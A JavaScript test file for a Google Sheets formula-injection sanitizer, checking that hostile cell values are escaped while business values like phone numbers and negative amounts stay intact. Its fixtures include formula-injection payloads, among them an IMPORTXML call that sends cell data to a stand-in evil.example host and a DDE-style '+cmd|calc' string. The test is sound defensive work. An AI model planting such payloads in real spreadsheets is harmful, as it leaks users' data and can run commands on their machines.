'use strict';

/**
 * SEC-FI1 — Google Sheets formula-injection guard.
 *
 * Every write goes out with valueInputOption 'USER_ENTERED', so a cell whose
 * value starts with = + - @ is EVALUATED. Free text typed into the bot lands
 * in cells verbatim, so this guard escapes those values with the leading
 * apostrophe Sheets strips on storage.
 *
 * The tests below pin both halves: hostile input is neutralised, and every
 * shape of legitimate business data this codebase writes is left byte-identical
 * (that second half is the regression risk — a phone number or a negative
 * adjustment must not silently become text).
 */

const test = require('node:test');
const assert = require('node:assert/strict');

const { _internals } = require('../../../src/repositories/sheetsClient');
const { sanitizeCell, sanitizeRows } = _internals;

test('formula payloads are neutralised', () => {
  const hostile = [
    '=IMPORTXML("https://evil.example/"&A1,"//a")',
    '=1+1',
    '=HYPERLINK("https://evil.example","click")',
    '@SUM(A1:A9)',
    '-- drop',
    '+cmd|calc',
  ];
  for (const v of hostile) {
    assert.equal(sanitizeCell(v), `'${v}`, `should escape: ${v}`);
  }
});

test('legitimate business values are untouched (no silent retyping)', () => {
  const safe = [
    // designs, shades, bale numbers, warehouses, customers
    '9043-B', 'Kano office', 'madam oshodi cashmere', 'SA/2521', 'BK/1',
    // numbers Sheets must keep typing as numbers
    '30', '4826.5', '0',
    // negative adjustments and phone numbers both start with a formula lead
    // character but parse as finite numbers, so their storage is unchanged
    '-5', '-12.75', '+2348012345678',
    // ISO + local dates
    '2026-07-25', '25-07-2026',
    // already-escaped values (settingsRepository does this itself)
    "'6172817425",
  ];
  for (const v of safe) {
    assert.equal(sanitizeCell(v), v, `should NOT change: ${v}`);
  }
});

test('non-strings and empties pass through by identity', () => {
  assert.equal(sanitizeCell(30), 30);
  assert.equal(sanitizeCell(0), 0);
  assert.equal(sanitizeCell(''), '');
  assert.equal(sanitizeCell(null), null);
  assert.equal(sanitizeCell(undefined), undefined);
  assert.equal(sanitizeCell(true), true);
});

test('an already-escaped value is never double-escaped', () => {
  assert.equal(sanitizeCell("'=1+1"), "'=1+1");
});

test('sanitizeRows walks a full rows payload and preserves shape', () => {
  const rows = [
    ['824', '9006', '=IMPORTXML("http://x","//a")', 30],
    ['825', '9032', 'cream', -5],
  ];
  const out = sanitizeRows(rows);
  assert.deepEqual(out, [
    ['824', '9006', '\'=IMPORTXML("http://x","//a")', 30],
    ['825', '9032', 'cream', -5],
  ]);
  assert.equal(out.length, rows.length);
  assert.equal(out[0].length, rows[0].length);
});

test('sanitizeRows tolerates malformed payloads without throwing', () => {
  assert.equal(sanitizeRows(null), null);
  assert.deepEqual(sanitizeRows([]), []);
  assert.deepEqual(sanitizeRows(['not-a-row']), ['not-a-row']);
});
